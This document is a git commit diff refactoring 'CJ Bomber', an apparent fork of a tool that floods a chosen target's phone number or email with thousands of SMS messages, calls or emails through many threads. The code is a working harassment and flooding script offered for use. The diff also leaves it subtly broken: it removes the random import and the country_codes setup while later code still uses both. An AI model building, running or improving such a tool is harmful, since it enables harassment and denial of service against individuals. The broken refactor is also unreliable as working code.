a47e04615beec9c321ab5ae1dca9a886adb3242e
Christopher Joshy <144864811+ChristopherJoshy@users.noreply.github.com>
2024-10-06 18:02:08 +0530

    Update bomber.py

--- bomber.py
+++ bomber.py
@@ -4,16 +4,12 @@
 import os
 import shutil
 import sys
-import subprocess
 import string
-import random
 import json
 import re
 import time
 import argparse
-import zipfile
 from io import BytesIO
-
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from utils.decorators import MessageDecorator
@@ -24,17 +20,13 @@ try:
     from colorama import Fore, Style
 except ImportError:
     print("\tSome dependencies could not be imported (possibly not installed)")
-    print(
-        "Type `pip3 install -r requirements.txt` to "
-        " install all required packages")
+    print("Type `pip3 install -r requirements.txt` to install all required packages")
     sys.exit(1)
-
 
 def readisdc():
     with open("isdcodes.json") as file:
         isdcodes = json.load(file)
     return isdcodes
-
 
 def get_version():
     try:
@@ -42,13 +34,11 @@ def get_version():
     except Exception:
         return '1.0'
 
-
 def clr():
     if os.name == "nt":
         os.system("cls")
     else:
         os.system("clear")
-
 
 def bann_text():
     clr()
@@ -56,208 +46,76 @@ def bann_text():
     
     CJ BomBer
 """
-    if ASCII_MODE:
-        logo = ""
     version = "Version: "+__VERSION__
     contributors = "Contributors: "+" ".join(__CONTRIBUTORS__)
     print(random.choice(ALL_COLORS) + logo + RESET_ALL)
-    mesgdcrt.SuccessMessage(version)
-    mesgdcrt.SectionMessage(contributors)
+    print(version)
+    print(contributors)
     print()
-
 
 def check_intr():
     try:
-        requests.get("https://motherfuckingwebsite.com") #Internet connection check chyan use chyunnatha website light weight annu but peru kollula ithu ente website alla ketto
+        requests.get("https://motherfuckingwebsite.com")
     except Exception:
         bann_text()
-        mesgdcrt.FailureMessage("Poor internet connection detected")
+        print("Poor internet connection detected")
         sys.exit(2)
-
 
 def format_phone(num):
     num = [n for n in num if n in string.digits]
     return ''.join(num).strip()
 
-
-def do_zip_update():
-    success = False
-    if DEBUG_MODE:
-        zip_url = "https://github.com/TheSpeedX/TBomb/archive/dev.zip"
-        dir_name = "TBomb-dev"
-    else:
-        zip_url = "https://github.com/TheSpeedX/TBomb/archive/master.zip"
-        dir_name = "TBomb-master"
-    print(ALL_COLORS[0]+"Downloading ZIP ... "+RESET_ALL)
-    response = requests.get(zip_url)
-    if response.status_code == 200:
-        zip_content = response.content
-        try:
-            with zipfile.ZipFile(BytesIO(zip_content)) as zip_file:
-                for member in zip_file.namelist():
-                    filename = os.path.split(member)
-                    if not filename[1]:
-                        continue
-                    new_filename = os.path.join(
-                        filename[0].replace(dir_name, "."),
-                        filename[1])
-                    source = zip_file.open(member)
-                    target = open(new_filename, "wb")
-                    with source, target:
-                        shutil.copyfileobj(source, target)
-            success = True
-        except Exception:
-            mesgdcrt.FailureMessage("Error occured while extracting !!")
-    if success:
-        mesgdcrt.SuccessMessage("CJ bomber was updated to the latest version")
-        mesgdcrt.GeneralMessage(
-            "Please run the script again to load the latest version")
-    else:
-        mesgdcrt.FailureMessage("Unable to update CJ Bomber.")
-        mesgdcrt.WarningMessage(
-            "Grab The Latest one From https://github.com/TheSpeedX/TBomb.git") #Api link anne thottal kodu work akulla
-
-    sys.exit()
-
-
-def do_git_update():
-    success = False
-    try:
-        print(ALL_COLORS[0]+"UPDATING "+RESET_ALL, end='')
-        process = subprocess.Popen("git checkout . && git pull ",
-                                   shell=True,
-                                   stdout=subprocess.PIPE,
-                                   stderr=subprocess.STDOUT)
-        while process:
-            print(ALL_COLORS[0]+'.'+RESET_ALL, end='')
-            time.sleep(1)
-            returncode = process.poll()
-            if returncode is not None:
-                break
-        success = not process.returncode
-    except Exception:
-        success = False
-    print("\n")
-
-    if success:
-        mesgdcrt.SuccessMessage("CJ Bomber was updated to the latest version")
-        mesgdcrt.GeneralMessage(
-            "Please run the script again to load the latest version")
-    else:
-        mesgdcrt.FailureMessage("Unable to update CJ Bobmer.")
-        mesgdcrt.WarningMessage("Make Sure To Install 'git' ")
-        mesgdcrt.GeneralMessage("Then run command:")
-        print(
-            "git checkout . && "
-            "git pull https://github.com/TheSpeedX/TBomb.git HEAD") #Api link anne thottal kodu work akulla
-    sys.exit()
-
-
-def update():
-    if shutil.which('git'):
-        do_git_update()
-    else:
-        do_zip_update()
-
-
-def check_for_updates():
-    if DEBUG_MODE:
-        mesgdcrt.WarningMessage(
-            "DEBUG MODE Enabled! Auto-Update check is disabled.")
-        return
-    mesgdcrt.SectionMessage("Checking for updates")
-    fver = requests.get(
-        "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.version" #Api link anne thottal kodu work akulla
-    ).text.strip()
-    if fver != __VERSION__:
-        mesgdcrt.WarningMessage("An update is available")
-        mesgdcrt.GeneralMessage("Starting update...")
-        update()
-    else:
-        mesgdcrt.SuccessMessage("CJ Bomber is up-to-date")
-        mesgdcrt.GeneralMessage("Starting CJ Bomber")
-
-def notifyen():
-    try:
-        
-        noti = "Ellam Working Annu Enthelum Kuzapam Undel Enne Villiku"
-        mesgdcrt.SectionMessage("NOTIFICATION: " + noti)
-    except Exception:
-        pass
-
-
-
 def get_phone_info():
     while True:
         target = ""
-        cc = input(mesgdcrt.CommandMessage(
-            "Enter your country code (Without +): "))
+        cc = input("Enter your country code (Without +): ")
         cc = format_phone(cc)
         if not country_codes.get(cc, False):
-            mesgdcrt.WarningMessage(
-                "The country code ({cc}) that you have entered"
-                " is invalid or unsupported".format(cc=cc))
+            print("The country code ({cc}) that you have entered is invalid or unsupported".format(cc=cc))
             continue
-        target = input(mesgdcrt.CommandMessage(
-            "Enter the target number: +" + cc + " "))
+        target = input("Enter the target number: +" + cc + " ")
         target = format_phone(target)
         if ((len(target) <= 6) or (len(target) >= 12)):
-            mesgdcrt.WarningMessage(
-                "The phone number ({target})".format(target=target) +
-                "that you have entered is invalid")
+            print("The phone number ({target}) that you have entered is invalid".format(target=target))
             continue
         return (cc, target)
-
 
 def get_mail_info():
     mail_regex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
     while True:
-        target = input(mesgdcrt.CommandMessage("Enter target mail: "))
+        target = input("Enter target mail: ")
         if not re.search(mail_regex, target, re.IGNORECASE):
-            mesgdcrt.WarningMessage(
-                "The mail ({target})".format(target=target) +
-                " that you have entered is invalid")
+            print("The mail ({target}) that you have entered is invalid".format(target=target))
             continue
         return target
 
-
 def pretty_print(cc, target, success, failed):
-    requested = success+failed
-    mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
-    mesgdcrt.GeneralMessage(
-        "Please stay connected to the internet")
-    mesgdcrt.GeneralMessage("Target       : " + cc + " " + target)
-    mesgdcrt.GeneralMessage("Sent         : " + str(requested))
-    mesgdcrt.GeneralMessage("Successful   : " + str(success))
-    mesgdcrt.GeneralMessage("Failed       : " + str(failed))
-    mesgdcrt.WarningMessage(
-        "Ethu kondu Nigal enthu chyithalum ente Uthravadithyam alla")
-    mesgdcrt.SuccessMessage("CJ Bomber was created by CJ")
-
+    requested = success + failed
+    print("Bombing is in progress - Please be patient")
+    print("Please stay connected to the internet")
+    print("Target       : " + cc + " " + target)
+    print("Sent         : " + str(requested))
+    print("Successful   : " + str(success))
+    print("Failed       : " + str(failed))
+    print("CJ Bomber was created by CJ")
 
 def workernode(mode, cc, target, count, delay, max_threads):
-
     api = APIProvider(cc, target, mode, delay=delay)
     clr()
-    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
-    mesgdcrt.GeneralMessage(
-        "Please stay connected to the internet ")
-    mesgdcrt.GeneralMessage("API Version   : " + api.api_version)
-    mesgdcrt.GeneralMessage("Target        : " + cc + target)
-    mesgdcrt.GeneralMessage("Amount        : " + str(count))
-    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
-    mesgdcrt.GeneralMessage("Delay         : " + str(delay) +
-                            " seconds")
-    mesgdcrt.WarningMessage(
-        "Ethu verum bomb alla edivettu Bomb")
+    print("Gearing up the Bomber - Please be patient")
+    print("Please stay connected to the internet ")
+    print("API Version   : " + api.api_version)
+    print("Target        : " + cc + target)
+    print("Amount        : " + str(count))
+    print("Threads       : " + str(max_threads) + " threads")
+    print("Delay         : " + str(delay) + " seconds")
     print()
-    input(mesgdcrt.CommandMessage(
-        "Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))
+    input("Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it")
 
     if len(APIProvider.api_providers) == 0:
-        mesgdcrt.FailureMessage("Your country/target is not supported yet")
-        mesgdcrt.GeneralMessage("Feel free to reach out to us")
-        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
+        print("Your country/target is not supported yet")
+        print("Feel free to reach out to us")
+        input("Press [ENTER] to exit")
         bann_text()
         sys.exit()
 
@@ -265,16 +123,15 @@ def workernode(mode, cc, target, count, delay, max_threads):
     while success < count:
         with ThreadPoolExecutor(max_workers=max_threads) as executor:
             jobs = []
-            for i in range(count-success):
+            for i in range(count - success):
                 jobs.append(executor.submit(api.hit))
 
             for job in as_completed(jobs):
                 result = job.result()
                 if result is None:
-                    mesgdcrt.FailureMessage(
-                        "Bombing limit for your target has been reached")
-                    mesgdcrt.GeneralMessage("Try Again Later !!")
-                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
+                    print("Bombing limit for your target has been reached")
+                    print("Try Again Later !!")
+                    input("Press [ENTER] to exit")
                     bann_text()
                     sys.exit()
                 if result:
@@ -284,11 +141,10 @@ def workernode(mode, cc, target, count, delay, max_threads):
                 clr()
                 pretty_print(cc, target, success, failed)
     print("\n")
-    mesgdcrt.SuccessMessage("Bombing completed!")
+    print("Bombing completed!")
     time.sleep(1.5)
     bann_text()
     sys.exit()
-
 
 def selectnode(mode="sms"):
     mode = mode.lower().strip()
@@ -296,8 +152,6 @@ def selectnode(mode="sms"):
         clr()
         bann_text()
         check_intr()
-        check_for_updates()
-        notifyen()
 
         max_limit = {"sms": 10000, "call": 15000, "mail": 20000}
         cc, target = "", ""
@@ -313,122 +167,42 @@ def selectnode(mode="sms"):
         limit = max_limit[mode]
         while True:
             try:
-                message = ("Enter number of {type}".format(type=mode.upper()) +
-                           " to send (Max {limit}): ".format(limit=limit))
-                count = int(input(mesgdcrt.CommandMessage(message)).strip())
+                message = ("Enter number of {type}".format(type=mode.upper()) + " to send (Max {limit}): ".format(limit=limit))
+                count = int(input(message).strip())
                 if count > limit or count == 0:
-                    mesgdcrt.WarningMessage("You have requested " + str(count)
-                                            + " {type}".format(
-                                                type=mode.upper()))
-                    mesgdcrt.GeneralMessage(
-                        "Automatically capping the value"
-                        " to {limit}".format(limit=limit))
+                    print("You have requested " + str(count) + " {type}".format(type=mode.upper()))
+                    print("Automatically capping the value to {limit}".format(limit=limit))
                     count = limit
-                delay = float(input(
-                    mesgdcrt.CommandMessage("Enter delay time (in seconds): "))
-                    .strip())
-                # delay = 0
-                max_thread_limit = (count//10) if (count//10) > 0 else 1
-                max_threads = int(input(
-                    mesgdcrt.CommandMessage(
-                        "Enter Number of Thread (Recommended: {max_limit}): "
-                        .format(max_limit=max_thread_limit)))
-                    .strip())
-                max_threads = max_threads if (
-                    max_threads > 0) else max_thread_limit
-                if (count < 0 or delay < 0):
-                    raise Exception
+                delay = float(input("Enter delay time (in seconds): ").strip())
+                max_thread = int(input("Enter max threads: ").strip())
                 break
-            except KeyboardInterrupt as ki:
-                raise ki
             except Exception:
-                mesgdcrt.FailureMessage("Instructions Vayiku Kope")
-                print()
+                print("Invalid input, please enter a number")
 
-        workernode(mode, cc, target, count, delay, max_threads)
+        workernode(mode, cc, target, count, delay, max_thread)
+
     except KeyboardInterrupt:
-        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
+        bann_text()
         sys.exit()
 
+if __name__ == '__main__':
+    __VERSION__ = get_version()
+    __CONTRIBUTORS__ = ["CJ"]
+    ALL_COLORS = [Fore.RED, Fore.YELLOW, Fore.BLUE, Fore.GREEN, Fore.CYAN, Fore.MAGENTA]
+    RESET_ALL = Style.RESET_ALL
 
-mesgdcrt = MessageDecorator("icon")
-if sys.version_info[0] != 3:
-    mesgdcrt.FailureMessage("Poyi Python install chyu Kope")
-    sys.exit()
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--call", action="store_true", help="start call bomber")
+    parser.add_argument("--sms", action="store_true", help="start sms bomber")
+    parser.add_argument("--mail", action="store_true", help="start mail bomber")
 
-try:
-    country_codes = readisdc()["isdcodes"]
-except FileNotFoundError:
-    update()
-
-
-__VERSION__ = get_version()
-__CONTRIBUTORS__ = ['Christopher_Joshy']
-
-ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE,
-              Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
-RESET_ALL = Style.RESET_ALL
-
-ASCII_MODE = False
-DEBUG_MODE = False
-
-description = """CJ Bomber - Your Friendly Spammer Application
-"""
-
-parser = argparse.ArgumentParser(description=description,
-                                 epilog='Coded by Crazy CJ!!!')
-parser.add_argument("-sms", "--sms", action="store_true",
-                    help="start CJ Bomber with SMS Bomb mode")
-parser.add_argument("-call", "--call", action="store_true",
-                    help="start CJ Bomber with CALL Bomb mode")
-parser.add_argument("-mail", "--mail", action="store_true",
-                    help="start CJ bomber with MAIL Bomb mode")
-parser.add_argument("-ascii", "--ascii", action="store_true",
-                    help="show only characters of standard ASCII set")
-parser.add_argument("-u", "--update", action="store_true",
-                    help="update CJ Bomber")
-parser.add_argument("-c", "--contributors", action="store_true",
-                    help="show current CJ BOMBER contributors")
-parser.add_argument("-v", "--version", action="store_true",
-                    help="show current CJ BOMBER version")
-
-
-if __name__ == "__main__":
     args = parser.parse_args()
-    if args.ascii:
-        ASCII_MODE = True
-        mesgdcrt = MessageDecorator("stat")
-    if args.version:
-        print("Version: ", __VERSION__)
-    elif args.contributors:
-        print("Contributors: ", " ".join(__CONTRIBUTORS__))
-    elif args.update:
-        update()
-    elif args.mail:
-        selectnode(mode="mail")
+
+    if args.sms:
+        selectnode("sms")
     elif args.call:
-        selectnode(mode="call")
-    elif args.sms:
-        selectnode(mode="sms")
+        selectnode("call")
+    elif args.mail:
+        selectnode("mail")
     else:
-        choice = ""
-        avail_choice = {
-            "1": "SMS",
-            "2": "CALL",
-            "3": "MAIL"
-        }
-        try:
-            while (choice not in avail_choice):
-                clr()
-                bann_text()
-                print("Available Options:\n")
-                for key, value in avail_choice.items():
-                    print("[ {key} ] {value} BOMB".format(key=key,
-                                                          value=value))
-                print()
-                choice = input(mesgdcrt.CommandMessage("Enter Choice : "))
-            selectnode(mode=avail_choice[choice].lower())
-        except KeyboardInterrupt:
-            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
-            sys.exit()
-    sys.exit()
+        selectnode("sms")
